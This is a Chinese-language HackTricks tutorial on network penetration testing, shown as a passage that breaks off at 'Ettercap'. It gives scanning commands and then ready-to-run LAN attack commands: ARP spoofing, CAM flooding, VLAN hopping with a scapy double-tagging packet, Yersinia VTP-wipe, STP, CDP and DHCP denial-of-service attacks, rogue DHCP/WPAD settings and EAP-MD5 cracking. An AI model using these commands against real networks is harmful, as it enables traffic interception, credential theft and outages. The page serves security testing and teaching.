# 网络渗透测试

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**赏金提示**：**注册**Intigriti，这是一家由黑客创建的高级**赏金平台**！立即加入我们，访问[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 从外部发现主机

这将是一个关于如何找到**从互联网响应的IP**的**简短部分**。\
在这种情况下，您有一些**IP范围**（甚至可能有几个**范围**），您只需找到**哪些IP正在响应**。

### ICMP

这是发现主机是否启动的**最简单**和**最快**的方法。\
您可以尝试发送一些**ICMP**数据包并**期望响应**。最简单的方法就是发送一个**回显请求**并期望响应。您可以使用简单的`ping`或使用`fping`来处理**范围**。\
您还可以使用**nmap**发送其他类型的ICMP数据包（这将避免常见的ICMP回显请求-响应过滤器）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP端口发现

通常会发现各种类型的ICMP数据包被过滤。因此，您可以做的就是**尝试查找开放的端口**来检查主机是否在线。每台主机有**65535个端口**，因此，如果您有一个“大”范围，您**无法**测试每个主机的**每个端口**是否开放，这将花费太多时间。\
因此，您需要一个**快速端口扫描工具**（[masscan](https://github.com/robertdavidgraham/masscan)）和一个**常用端口列表**：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP端口发现

这只是一个TCP端口发现，当您想要**专注于发现HTTP服务**时非常有用：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP端口发现

您还可以尝试检查一些**UDP端口是否开放**，以决定是否应该对一个**主机**给予**更多关注**。由于UDP服务通常不会对常规空的UDP探测数据包做出任何响应，因此很难判断端口是被过滤还是开放的。最简单的方法是发送与运行服务相关的数据包，但由于您不知道运行的是哪种服务，因此应该根据端口号尝试最有可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
在此之前提出的nmap命令将测试**/24**范围内每个主机的**前1000个UDP端口**，但即使如此，这将花费**>20分钟**。如果需要**更快的结果**，您可以使用[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)：`./udp-proto-scanner.pl 199.66.11.53/24`。这将向它们的**预期端口**发送这些**UDP探针**（对于/24范围，这只需1分钟）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP端口发现
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## 网络渗透测试Wifi

在这里，您可以找到一份关于所有众所周知的Wifi攻击的详细指南：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 从内部发现主机

如果您在网络内部，您可能首先想要做的事情之一就是**发现其他主机**。根据您可以/想要制造的**噪音量**的多少，可以执行不同的操作：

### 被动

您可以使用以下工具被动地发现连接网络内部的主机：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动

请注意，[_**从外部发现主机**_](./#discovering-hosts-from-the-outside)（_TCP/HTTP/UDP/SCTP端口发现_）中评论的技术也可以在这里**应用**。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多的事情**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 主动 ICMP

请注意，_从外部发现主机_（[_**ICMP**_](./#icmp)）中评论的技术也可以**应用于这里**。\
但是，由于您与其他主机在**同一网络**中，您可以做**更多的事情**：

- 如果您**ping**一个**子网广播地址**，则ping应该到达**每个主机**，它们可以**响应**给**您**：`ping -b 10.10.5.255`
- 对**网络广播地址**进行ping，甚至可以找到**其他子网内的主机**：`ping -b 255.255.255.255`
- 使用`nmap`的`-PE`、`-PP`、`-PM`标志执行主机发现，分别发送**ICMPv4 echo**、**时间戳**和**子网掩码请求**：`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **唤醒局域网**

唤醒局域网用于通过**网络消息****打开**计算机。用于打开计算机的魔术数据包只是一个数据包，其中提供了一个**MAC Dst**，然后在同一个数据包中**重复16次**。\
然后，这种类型的数据包通常发送到**以太网 0x0842**或**UDP数据包到端口9**。\
如果未提供**\[MAC]**，则数据包将发送到**广播以太网**（广播MAC将被重复）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦您发现了所有要深入扫描的IP（外部或内部），可以执行不同的操作。

### TCP

* **开放**端口：_SYN --> SYN/ACK --> RST_
* **关闭**端口：_SYN --> RST/ACK_
* **过滤**端口：_SYN --> \[无响应]_
* **过滤**端口：_SYN --> ICMP消息_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

有两种选项来扫描 UDP 端口：

- 发送一个 **UDP 数据包** 并检查响应是否为 _**ICMP 不可达**_，如果端口是 **关闭** 的（在某些情况下，ICMP 将被 **过滤**，因此您将无法收到有关端口是关闭还是打开的信息）。
- 发送一个 **格式化数据报** 来引发一个来自 **服务** 的响应（例如，DNS、DHCP、TFTP 等，在 _nmap-payloads_ 中列出）。如果您收到一个 **响应**，那么端口是 **打开** 的。

**Nmap** 将使用 "-sV" **混合** 这两个选项（UDP 扫描非常慢），但请注意 UDP 扫描比 TCP 扫描慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP扫描

SCTP与TCP和UDP并列。旨在通过IP提供**电话**数据的**传输**，该协议复制了信令系统7（SS7）的许多可靠性功能，并支持一个称为SIGTRAN的更大协议系列。SCTP受到包括IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS和VxWorks在内的操作系统的支持。

nmap提供了两种不同的SCTP扫描：_-sY_和_-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS和IPS规避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **更多nmap选项**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 揭示内部IP地址

配置错误的路由器、防火墙和网络设备有时会使用非公共源地址响应网络探测。您可以使用tcpdump来识别在测试期间从私有地址接收的数据包。在这种情况下，Kali Linux中的eth2接口可以从公共互联网访问（如果您在NAT或防火墙后面，这种数据包可能会被过滤）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

通过查看捕获的帧和数据包，您可以了解IP范围、子网大小、MAC地址和主机名的详细信息。如果网络配置不正确或交换机结构压力过大，攻击者可以通过被动网络嗅探捕获敏感材料。

如果交换式以太网网络配置正确，您只会看到广播帧和发送到您的MAC地址的材料。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
一个人也可以通过Wireshark作为GUI实时在SSH会话中从远程计算机捕获数据包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显而易见。

### 捕获凭证

您可以使用类似[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)的工具来从pcap文件或实时接口中解析凭证。

## 局域网攻击

### ARP欺骗

ARP欺骗是指发送伪造的ARP响应，指示某台机器的IP具有我们设备的MAC地址。然后，受害者将更改ARP表，并在每次想要联系伪造IP时与我们的机器联系。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoof是一个简单的工具，用于欺骗局域网上的主机，使其相信攻击者的机器是网络中的网关。这种技术通常用于中间人攻击，以便监视或篡改受害者和网关之间的通信。
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flood攻击 - CAM表溢出

通过发送大量具有不同源MAC地址的数据包来溢出交换机的CAM表。当CAM表已满时，交换机会开始表现得像集线器一样（广播所有流量）。
```bash
macof -i <interface>
```
### 802.1Q VLAN / DTP Attacks

#### 动态干线

**DTP（动态干线协议）**是一种链路层协议，旨在提供自动干线系统。通过DTP，交换机决定哪个端口将以干线模式（Trunk）工作，哪个端口不会。**使用DTP表明网络设计不佳。干线应该严格**放在需要的地方，并且应该有文档记录。

**默认情况下，所有交换机端口都在动态自动模式下运行。**这表示交换机端口处于从相邻交换机启动干线的模式。**渗透测试人员需要物理连接到交换机并发送一个DTP Desirable帧**，这将触发端口切换到干线模式。攻击者随后可以通过创建虚拟接口，使用STP帧分析枚举VLAN并绕过VLAN分割。

许多交换机默认支持动态干线协议（DTP），然而，对手可以滥用它来**模拟交换机并接收所有VLAN的流量**。工具[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)可以嗅探一个接口，并**报告交换机是否处于默认模式、干线、动态、自动或访问模式**（这是唯一可以避免VLAN跳跃的模式）。该工具将指示交换机是否存在漏洞。

如果发现网络存在漏洞，您可以使用_**Yersinia**_启动一个使用协议“**DTP**”的“**启用干线**”，从而能够查看来自所有VLAN的网络数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

要枚举VLAN，也可以使用脚本[**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**生成DTP Desirable帧。**切勿在任何情况下中断脚本。它每三秒注入一个DTP Desirable。**交换机上动态创建的干道通道只能存活五分钟。五分钟后，干道会掉落。**
```
sudo python3 DTPHijacking.py --interface eth0
```
我想指出**Access/Desirable (0x03)**表示DTP帧是Desirable类型，告诉端口切换到Trunk模式。而**802.1Q/802.1Q (0xa5)**表示**802.1Q**封装类型。

通过分析STP帧，**我们了解到VLAN 30和VLAN 60的存在。**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 攻击特定VLAN

一旦您知道VLAN ID和IP值，您可以**配置虚拟接口以攻击特定VLAN**。\
如果DHCP不可用，则使用_ifconfig_设置静态IP地址。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自动 VLAN 跳跃器

讨论的攻击**动态干线和创建虚拟接口以及发现其他 VLAN 中的主机**是由工具自动执行的：[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### 双重标记

如果攻击者知道受害主机的**MAC、IP 和 VLAN ID 的值**，他可以尝试用指定的 VLAN 和受害者的 VLAN **双重标记一个帧**，然后发送一个数据包。由于**受害者无法与攻击者连接回来**，所以**攻击者的最佳选择是通过 UDP 通信**到可以执行一些有趣操作的协议（如 SNMP）。

攻击者的另一个选择是发起**TCP 端口扫描，欺骗受害者可访问的由攻击者控制的 IP**（可能通过互联网）。然后，攻击者可以嗅探他拥有的第二个主机，看看它是否收到来自受害者的一些数据包。

![](<../../.gitbook/assets/image (635) (1).png>)

要执行此攻击，您可以使用 scapy：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### 侧向 VLAN 分割绕过 <a href="#d679" id="d679"></a>

如果您可以**访问直接连接的交换机**，则可以在网络中**绕过 VLAN 分割**。只需将端口切换到干线模式（也称为干线），使用目标 VLAN 的 ID 创建虚拟接口，并配置 IP 地址。您可以尝试动态请求地址（DHCP），也可以静态配置。这取决于具体情况。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### 第 3 层私有 VLAN 绕过

在客用无线网络和其他环境中，私有 VLAN（也称为 _端口隔离_）设置用于**防止对等方互动**（即，客户端**连接到无线接入点但无法相互通信**）。根据网络 ACL（或缺乏 ACL），可能会将 IP 数据包发送到路由器，然后再转发给相邻对等方。

此攻击将向客户端的 IP 发送**经过特殊构造的数据包，但使用路由器的 MAC 地址**。然后，**路由器将将数据包重定向到客户端**。与 _双标记攻击_ 一样，您可以通过控制受害者可访问的主机来利用此漏洞。

### VTP 攻击

**VTP（VLAN 干线协议）**是一种旨在集中管理 VLAN 的协议。为了跟踪当前的 VLAN 数据库，交换机会检查特殊的修订号。当发生任何表更新时，修订号会递增一次。如果交换机检测到具有更高修订号的配置，则它将自动更新其 VLAN 数据库。

#### VTP 域中的角色 <a href="#ebfc" id="ebfc"></a>

* **VTP 服务器。** 处于 VTP 服务器角色的交换机可以创建新的 VLAN、删除旧的 VLAN，或更改 VLAN 本身的信息。**它还会为域中的其他成员生成 VTP 公告。**
* **VTP 客户端。** 处于此角色的交换机将从域中的其他交换机接收特定的 VTP 公告，以更新其自己的 VLAN 数据库。客户端在创建 VLAN 方面受到限制，甚至不允许在本地更改 VLAN 配置。换句话说，**只读访问。**
* **VTP 透明模式。** 在此模式下，交换机不参与 VTP 过程，并可以完全和本地地管理整个 VLAN 配置。在透明模式下运行时，交换机仅传输来自其他交换机的 VTP 公告，而不会影响其 VLAN 配置。**这些交换机的修订号始终为零，无法受到攻击。**

#### 广告类型 <a href="#b384" id="b384"></a>

* **摘要广告 —** VTP 服务器每**300 秒（5 分钟）**发送的 VTP 公告。此公告存储 VTP 域名、协议版本、时间戳和 MD5 配置哈希值。
* **子集广告 —** 每当 VLAN 配置更改时发送的 VTP 公告。
* **广告请求 —** 是 VTP 客户端向 VTP 服务器请求摘要广告消息。通常作为响应消息发送，以指示交换机检测到具有更高配置修订号的摘要广告。

VTP 只能从干线端口**受到攻击，因为 VTP 公告仅在干线端口上广播和接收。**因此，在攻击 DTP 后进行渗透测试时，您的下一个目标可能是 VTP。**要攻击 VTP 域，您可以使用 Yersinia 运行 VTP 注入，将**擦除整个 VLAN 数据库**，从而使网络瘫痪。

{% hint style="info" %}
VTP 协议有**三个版本**。在本文中，攻击针对第一个版本 VTPv1。
{% endhint %}
```bash
yersinia -G #For graphic mode
```
要删除整个VLAN数据库，请选择**删除所有VTP VLAN**选项

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP攻击

**如果您无法在接口上捕获BPDU帧，则很难成功进行STP攻击。**

#### **STP BPDU DoS**

发送大量的BPDUs TCP（拓扑更改通知）或Conf（在创建拓扑时发送的BPDUs），交换机会过载并停止正常工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 攻击**

当发送 TCP 时，交换机的 CAM 表将在 15 秒内被删除。然后，如果持续发送这种类型的数据包，CAM 表将不断重新启动（或每 15 秒）并在重新启动时，交换机将表现为集线器。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻击者模拟交换机的行为，成为网络的STP根。然后，更多数据将通过他传递。当您连接到两个不同的交换机时，这是很有趣的。\
这是通过发送BPDUs CONF数据包来实现的，其中指定**优先级**值小于实际根交换机的优先级。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到2个交换机，他可以成为新树的根，这两个交换机之间的所有流量都将通过他传递**（将执行中间人攻击）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻击

**思科发现协议（CDP）** 是思科设备用来相互通信、**发现存活设备**以及它们的功能的协议。

#### 信息收集 <a href="#0e0f" id="0e0f"></a>

**默认情况下，CDP会向所有端口发送通告。** 但是如果入侵者连接到同一交换机上的一个端口会怎样呢？使用网络嗅探工具，如**Wireshark**、**tcpdump**或**Yersinia**，他可以提取**有关设备本身的宝贵信息**，从其型号到思科IOS版本。利用这些信息，他将能够枚举相同版本的思科IOS并找到漏洞，然后利用它。

#### CDP 洪泛攻击 <a href="#0d6a" id="0d6a"></a>

您可以通过耗尽设备内存模拟真实的思科设备，对思科交换机发起拒绝服务（DoS）攻击。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
选择**泛洪CDP表**选项并开始攻击。交换机的CPU将被超载，以及CDP邻居表，**导致“网络瘫痪”。**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP冒充攻击
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
你也可以使用[**scapy**](https://github.com/secdev/scapy/)。请确保使用`scapy/contrib`软件包进行安装。

### VoIP 攻击

尽管旨在供员工使用的互联网电话（VoIP）电话，但现代VoIP设备越来越多地与物联网设备集成。许多员工现在可以使用特殊电话号码解锁门，控制房间的恒温器...

该工具[**voiphopper**](http://voiphopper.sourceforge.net)模拟了思科、Avaya、Nortel 和 Alcatel-Lucent 环境中 VoIP 电话的行为。它使用其支持的设备发现协议之一（如思科发现协议（CDP）、动态主机配置协议（DHCP）、链路层发现协议媒体端点发现（LLDP-MED）和 802.1Q ARP）自动发现语音网络的正确 VLAN ID。

**VoIP Hopper** 支持**三种** CDP 模式。**sniff** 模式检查网络数据包并尝试定位 VLAN ID。要使用它，请将**`-c`**参数设置为`0`。**spoof** 模式生成类似于真实 VoIP 设备在企业网络中传输的自定义数据包。要使用它，请将**`-c`**参数设置为**`1`**。带有**pre-madepacket**的欺骗模式发送与 Cisco 7971G-GE IP 电话相同的数据包。要使用它，请将**`-c`**参数设置为**`2`**。

我们使用最后一种方法，因为它是最快的方法。**`-i`**参数指定攻击者的**网络** **接口**，**`-E`**参数指定要模仿的**VOIP 设备的名称**。我们选择了名称 SEP001EEEEEEEEE，这与思科VoIP电话的命名格式兼容。该格式由“SEP”一词后跟 MAC 地址组成。在企业环境中，您可以通过查看电话背面的 MAC 标签；按下设置按钮并在电话显示屏上选择模型信息选项；或将 VoIP 设备的以太网电缆连接到您的笔记本电脑，并使用 Wireshark 观察设备的 CDP 请求来模仿现有的 VoIP 设备。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
如果工具成功执行，**VLAN网络将为攻击者的设备分配一个IPv4地址**。

### DHCP攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

针对 DHCP 服务器可以执行两种类型的 DoS 攻击。第一种类型是**模拟足够多的虚假主机以使用所有可能的 IP 地址**。\
只有在您能够看到 DHCP 服务器的响应并完成协议（**Discover**（计算机）--> **Offer**（服务器）--> **Request**（计算机）--> **ACK**（服务器））时，此攻击才会生效。例如，这在**Wifi 网络中是不可能的**。

执行 DHCP DoS 的另一种方法是发送一个**使用每个可能的 IP 作为源代码的 DHCP-RELEASE 数据包**。然后，服务器会认为每个人都已经完成了对该 IP 的使用。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
一种更自动化的方法是使用工具[DHCPing](https://github.com/kamorin/DHCPig)

您可以使用上述的DoS攻击来强制客户端在环境中获取新的租约，并耗尽合法服务器，使其无法响应。因此，当合法服务器尝试重新连接时，**您可以提供下一个攻击中提到的恶意值**。

#### 设置恶意值

您可以使用Responder DHCP脚本（_/usr/share/responder/DHCP.py_）来建立一个恶意的DHCP服务器。设置恶意网关并不理想，因为劫持的连接是半双工的（即，我们捕获客户端的出站数据包，但无法捕获合法网关的响应）。因此，我建议设置一个恶意的DNS或WPAD服务器来捕获HTTP流量和凭据。

| 描述                                       | 示例                                                                      |
| ---------------------------------------- | ------------------------------------------------------------------------ |
| 我们作为网关广告的IP地址                         | _-i 10.0.0.100_                                                          |
| 本地DNS域名（可选）                             | _-d example.org_                                                        |
| 原始路由器/网关的IP地址                           | _-r 10.0.0.1_                                                           |
| 主DNS服务器IP地址                             | _-p 10.0.0.100_                                                         |
| 次要DNS服务器IP地址（可选）                        | _-s 10.0.0.1_                                                           |
| 本地网络的子网掩码                              | _-n 255.255.255.0_                                                      |
| 用于监听DHCP流量的接口                            | _-I eth1_                                                              |
| WPAD配置地址（URL）                           | _-w “[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| 伪造默认网关IP地址                             | -S                                                                     |
| 响应所有DHCP请求（非常嘈杂）                        | -R                                                                     |

### **EAP攻击**

以下是针对802.1X实现可用的一些攻击策略：

* 通过EAP主动暴力破解密码
* 使用恶意的EAP内容攻击RADIUS服务器 _\*\*_(exploits)
* 捕获EAP消息并离线破解密码（EAP-MD5和PEAP）
* 强制使用EAP-MD5身份验证绕过TLS证书验证
* 在使用集线器或类似设备进行身份验证后注入恶意网络流量

如果攻击者位于受害者和认证服务器之间，他可以尝试降级（如果必要）认证协议到EAP-MD5，并捕获认证尝试。然后，他可以使用暴力破解：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP（GLBP和HSRP）攻击 <a href="#6196" id="6196"></a>

**FHRP**（第一跳冗余协议）是一类旨在**创建热备份路由系统**的网络协议。通过FHRP，物理路由器可以组合成单个逻辑设备，提高容错能力并帮助分担负载。

**思科系统工程师开发了两种FHRP协议，GLBP和HSRP。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

路由信息协议（RIP）存在三个版本—RIP、RIPv2和RIPng。RIP和RIPv2使用UDP数据报通过端口520发送到对等方，而RIPng通过IPv6组播向UDP端口521广播数据报。RIPv2引入了MD5认证支持。RIPng不包含原生认证；相反，它依赖于IPv6中的可选IPsec AH和ESP头部。

要了解如何攻击此协议的更多信息，请参阅书籍_**《网络安全评估：了解您的网络（第3版）》**_。

### EIGRP攻击

**EIGRP（增强内部网关路由协议）**是一种动态路由协议。**它是一种距离矢量协议。**如果**没有认证**和被动接口配置，**入侵者**可以干扰EIGRP路由并导致**路由表污染**。此外，EIGRP网络（换句话说，自治系统）**是平面的，没有分段成任何区域**。如果**攻击者注入一条路由**，这条路由很可能会**传播**到整个自治系统的EIGRP系统中。

要攻击EIGRP系统需要**与合法的EIGRP路由器建立邻居关系**，这将打开许多可能性，从基本的侦察到各种注入。

\*\*\*\*[**FRRouting**](https://frrouting.org/)允许您实现**支持BGP、OSPF、EIGRP、RIP和其他协议的虚拟路由器**。您只需在攻击者系统上部署它，实际上就可以假装成路由域中的合法路由器。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)还支持捕获EIGRP广播并注入数据包以操纵路由配置。有关如何使用Coly攻击的更多信息，请查看_**《网络安全评估：了解您的网络（第3版）》**_。

### OSPF

大多数Open Shortest Path First（OSPF）实现使用MD5提供路由器之间的认证。Loki和John the Ripper可以捕获和攻击MD5哈希以揭示密钥，然后可以用于广告新路由。通过使用_注入_选项卡设置路由参数，并在_连接_下设置密钥。

要了解如何攻击此协议的更多信息，请参阅书籍_**《网络安全评估：了解您的网络（第3版）》**_。

### 其他通用工具和资源

* [**Above**](https://github.com/c4s73r/Above)：用于扫描网络流量并查找漏洞的工具
* 您可以在[此处](https://github.com/Sab0tag3d/MITM-cheatsheet)找到有关网络攻击的更多信息。_（待办事项：阅读所有内容以及任何新攻击）_

## **欺骗**

攻击者配置所有网络参数（网关、IP、DNS）为发送虚假DHCP响应的网络新成员。
```bash
Ettercap
